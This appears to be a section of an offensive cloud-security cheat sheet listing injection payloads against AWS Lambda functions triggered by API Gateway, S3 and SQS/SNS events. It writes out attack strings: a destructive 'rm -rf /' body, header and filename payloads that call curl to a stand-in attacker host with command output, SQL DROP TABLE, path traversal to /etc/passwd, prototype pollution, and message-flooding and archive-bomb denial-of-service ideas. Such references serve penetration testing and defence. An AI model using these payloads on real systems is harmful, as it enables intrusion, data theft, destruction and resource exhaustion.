<event_injection>
<api_gateway_injection>
{% raw %}
# API Gateway -> Lambda event injection

# Lambda receives event object:
{
  "body": "...",
  "headers": {...},
  "queryStringParameters": {...},
  "pathParameters": {...},
  "requestContext": {...}
}

# Attack vectors:

# 1. Body injection:
POST /api/function
{"input": "'; rm -rf / #"}

# If Lambda executes input:
# In Python: eval(event['body']['input'])
# In Node.js: exec(event.body.input)

# 2. Header injection:
X-Custom-Header: $(curl http://attacker.com/$(whoami))
X-Forwarded-For: 127.0.0.1; $(id)

# 3. Query parameter injection:
GET /api/function?param=value'; DROP TABLE users;--

# 4. Path parameter injection:
GET /api/function/../../etc/passwd

# 5. JSON payload manipulation:
{
  "user": {
    "role": "admin",
    "__proto__": {"isAdmin": true}
  }
}
{% endraw %}
</api_gateway_injection>

<s3_event_injection>
{% raw %}
# S3 -> Lambda event injection

# Lambda triggered by S3 events:
# - s3:ObjectCreated:*
# - s3:ObjectRemoved:*

# Event structure:
{
  "Records": [{
    "s3": {
      "bucket": {"name": "my-bucket"},
      "object": {
        "key": "file.txt",
        "size": 1024
      }
    }
  }]
}

# Attack: Upload malicious file

# 1. Filename injection:
# Upload file: file.txt'; curl http://attacker.com #.jpg
# If Lambda processes filename without sanitization

# 2. Content injection:
# Upload file with malicious content
# If Lambda processes content (image, PDF, etc.)

# 3. Metadata injection:
aws s3 cp file.txt s3://bucket/ --metadata "cmd=id"
# Lambda reads metadata, executes command

# 4. Large file DoS:
# Upload extremely large file
# Lambda times out or exhausts memory processing it

# 5. Archive bomb (zip, tar):
# Upload compressed file that expands to huge size
# Lambda exhausts disk/memory extracting it
{% endraw %}
</s3_event_injection>

<sqs_sns_injection>
{% raw %}
# SQS/SNS -> Lambda event injection

# SQS event:
{
  "Records": [{
    "body": "<message-content>",
    "messageAttributes": {...}
  }]
}

# SNS event:
{
  "Records": [{
    "Sns": {
      "Message": "<message-content>",
      "MessageAttributes": {...}
    }
  }]
}

# Attack: Send malicious message

# 1. Command injection in message:
aws sqs send-message \
  --queue-url <url> \
  --message-body '{"cmd": "$(whoami)"}'

# If Lambda executes:
# exec(message['cmd'])

# 2. JSON injection:
{
  "user_id": 123,
  "command": "delete_account",
  "admin": true
}

# 3. Large message:
# Send max size message (256 KB for SQS)
# Multiple times to exhaust Lambda

# 4. Message flooding:
# Send thousands of messages
# Trigger Lambda repeatedly
# Exhaust concurrency limits or budget
{% endraw %}
</sqs_sns_injection>

